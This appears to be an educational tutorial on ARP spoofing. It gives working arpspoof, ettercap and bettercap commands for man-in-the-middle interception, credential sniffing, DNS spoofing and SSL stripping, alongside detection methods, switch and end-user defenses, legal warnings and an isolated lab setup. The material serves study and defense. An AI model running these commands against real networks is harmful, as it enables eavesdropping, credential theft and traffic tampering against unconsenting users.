# How ARP Spoofing Works - Technical Explanation

## Prerequisites

  You need:

- Device on the same local network as target

- Root/admin privileges on your device

- IP forwarding enabled (to avoid DoS)
  
  Common tools:

- arpspoof (dsniff package)

- ettercap

- bettercap

## The Attack Mechanics

### Step 1: Understanding Normal ARP

  Normal communication:
  Client (192.168.1.50) wants to reach Internet
     ↓
  Sends ARP: "Who has 192.168.1.1 (gateway)?"
     ↓
  Router: "I'm 192.168.1.1, my MAC is aa:bb:cc:dd:ee:ff"
     ↓
  Client updates ARP cache: 192.168.1.1 → aa:bb:cc:dd:ee:ff
     ↓
  Client sends packets to router's MAC

### Step 2: ARP Spoofing Attack

  Attacker inserts themselves:

  Attacker sends fake ARP to Client:
  "Hey, I'm 192.168.1.1 (gateway), my MAC is 99:88:77:66:55:44"

  Attacker sends fake ARP to Router:
  "Hey, I'm 192.168.1.50 (client), my MAC is 99:88:77:66:55:44"

  Result:
  Client → Thinks attacker is the gateway
  Router → Thinks attacker is the client
  All traffic flows through attacker (Man-in-the-Middle)

### Method 1: Using arpspoof

  Setup

# Install (Kali Linux has it pre-installed)

  sudo apt install dsniff

# Enable IP forwarding (crucial - otherwise it's just DoS)

  sudo sysctl -w net.ipv4.ip_forward=1

# Or

  echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

  Execute Attack

# Terminal 1: Poison victim's ARP cache (tell victim you're the gateway)

  sudo arpspoof -i wlan0 -t 192.168.1.50 192.168.1.1

# └─ victim     └─ gateway

# Sends continuous fake ARP: "192.168.1.1 is at [your MAC]"

# Terminal 2: Poison gateway's ARP cache (tell gateway you're the victim)

  sudo arpspoof -i wlan0 -t 192.168.1.1 192.168.1.50

# └─ gateway   └─ victim

# Sends continuous fake ARP: "192.168.1.50 is at [your MAC]"

  What happens:

- Victim's traffic → Goes to you → You forward to gateway

- Gateway's responses → Go to you → You forward to victim

- You see everything in the middle
  
  Capture Traffic
  
  # Terminal 3: Capture packets
  
  sudo tcpdump -i wlan0 -w capture.pcap host 192.168.1.50
  
  # Or use Wireshark for live analysis
  
  sudo wireshark -i wlan0 -k -f "host 192.168.1.50"

### Method 2: Using ettercap (Easier, More Features)

# Install

  sudo apt install ettercap-text-only

# Text-based attack

  sudo ettercap -T -M arp:remote /192.168.1.1// /192.168.1.50//

# │  │  │              └─ gateway   └─ victim

# │  │  └─ ARP poisoning mode with forwarding

# │  └─ Man-in-the-middle

# └─ Text mode (no GUI)

# Attack entire subnet (all devices)

  sudo ettercap -T -M arp:remote /192.168.1.1// /192.168.1.0-255//

# └─ All IPs in range

# With GUI (more user-friendly)

  sudo ettercap -G

# Then: Sniff → Unified sniffing → Select interface

# Hosts → Scan for hosts

# Add gateway to Target 1, victim to Target 2

# MITM → ARP poisoning → Sniff remote connections

### Method 3: Using bettercap (Modern, Powerful)

# Install

  sudo apt install bettercap

# Interactive mode

  sudo bettercap -iface wlan0

# In bettercap console:

> net.probe on                    # Discover hosts
> net.show                        # Show discovered hosts
> set arp.spoof.targets 192.168.1.50  # Set victim
> arp.spoof on                    # Start spoofing
> net.sniff on                    # Start capturing
> set http.proxy.sslstrip true    # SSL stripping (downgrades HTTPS)
> http.proxy on                   # Intercept HTTP

### What You Can Do After Successful MITM

1. Passive Sniffing
   
   # Capture credentials in plaintext protocols
   
   sudo ettercap -T -M arp:remote /192.168.1.1// /192.168.1.50// \
   -P repoison_arp
   
   # Filter for interesting data
   
   sudo tcpdump -A -i wlan0 | grep -i 'password\|user\|login'

2. DNS Spoofing (Redirect websites)
   
   # With ettercap + dns_spoof plugin
   
   # Edit /etc/ettercap/etter.dns:
   
   # microsoft.com A 192.168.1.100  # Redirect to fake site
   
   sudo ettercap -T -M arp:remote /192.168.1.1// /192.168.1.50// \
   -P dns_spoof

3. SSL Stripping (Downgrade HTTPS to HTTP)
   
   # Using sslstrip
   
   sudo sslstrip -l 8080 &
   sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 \
   -j REDIRECT --to-port 8080
   
   # Combined with ARP spoofing, victims see HTTP instead of HTTPS

4. Image Hijacking (Replace images)
   
   # With ettercap filters
   
   # Compile filter that replaces all images
   
   sudo ettercap -T -M arp:remote /192.168.1.1// /192.168.1.50// \
   -F image.ef
   
   Attack Diagram
   
   Normal Flow:
   [Victim] ←→ [Gateway/Router] ←→ [Internet]
   
   After ARP Spoofing:
   [Victim] ←→ [Attacker] ←→ [Gateway/Router] ←→ [Internet]
   
            └─ Sees everything, can modify traffic
   
   Detection by Victim
   
   How to detect you're being attacked:
   
   # Monitor ARP cache for changes
   
   watch -n 1 'arp -a'
   
   # Look for gateway MAC changing
   
   # Use arp-scan to verify gateway MAC
   
   sudo arp-scan --interface=wlan0 --localnet
   
   # Check for duplicate IPs
   
   sudo arping -D -I wlan0 192.168.1.1
   
   # Use detection tools
   
   sudo apt install arpwatch
   sudo arpwatch -i wlan0
   
   # Alerts on MAC address changes
   
   # Look for suspicious traffic patterns
   
   sudo iftop -i wlan0  # High traffic to/from one device

## Signs you're under attack:

  ⚠️ Gateway MAC address keeps changing⚠️ Connection slow or intermittent⚠️ HTTPS sites
   showing certificate warnings⚠️ HTTP instead of HTTPS unexpectedly⚠️ Two devices
  claim same IP address

  Defense Against ARP Spoofing

  For Network Admins:

# Enable DAI on switches (as discussed earlier)

  Switch(config)# ip arp inspection vlan 10

# Enable DHCP snooping

  Switch(config)# ip dhcp snooping vlan 10

# Port security

  Switch(config-if)# switchport port-security

  For End Users:

# 1. Use VPN (best defense)

  sudo openvpn --config company.ovpn

# Even if traffic intercepted, it's encrypted

# 2. Static ARP entries (for critical hosts)

  sudo ip neigh add 192.168.1.1 lladdr aa:bb:cc:dd:ee:ff dev wlan0

# 3. Use encrypted protocols only

# - HTTPS (not HTTP)

# - SSH (not Telnet)

# - SFTP (not FTP)

# 4. Enable ARP protection (if available)

# Some Linux distros have ARPguard, XArp, etc.

# 5. Monitor your ARP table

  sudo arpwatch -i wlan0

### Legal and Ethical Considerations

  ⚠️ IMPORTANT:

  Legal to test:

- Your own devices on your own network

- Authorized penetration testing with written permission

- Lab environments (VirtualBox, VMware)

- CTF competitions

- Educational purposes on isolated networks
  
  ILLEGAL without authorization:

- Coffee shop networks

- Corporate networks without permission

- Any network you don't own/admin

- Other people's devices

- Public WiFi (even if it's "open")
  
  Consequences:

- Computer Fraud and Abuse Act (CFAA) violations

- Wiretapping laws

- Criminal charges

- Civil liability

- Fines and imprisonment
  
  Lab Setup for Safe Testing
  
  Create isolated test environment:
  
  # Using VirtualBox/VMware
1. Create 3 VMs:
   
   - Victim (Ubuntu/Windows)
   - Attacker (Kali Linux)
   - Router/Gateway (pfSense or Linux)

2. Use "Internal Network" or "Host-Only" adapter
   (NOT bridged - keeps it isolated)

3. Configure:
   
   - Router: 192.168.100.1
   - Victim: 192.168.100.10
   - Attacker: 192.168.100.50

4. Test ARP spoofing safely without legal issues

### Summary

  How ARP spoofing works:

1. Attacker sends fake ARP replies

2. Victim/Gateway update ARP caches with attacker's MAC

3. Traffic flows through attacker (MITM position)

4. Attacker can read, modify, or drop packets
   
   Key tools:
- arpspoof - Simple, effective

- ettercap - Feature-rich, popular

- bettercap - Modern, powerful
  
  Protection:

- Network: Enable DAI on managed switches

- User: Use VPN, HTTPS, static ARP entries

- Monitor: arpwatch, IDS/IPS
  
  Remember: Only practice on networks you own or have explicit written permission to
  test. Unauthorized access is illegal and unethical.
  
  This knowledge is valuable for understanding network security, defending against
  attacks, and conducting authorized security assessments.
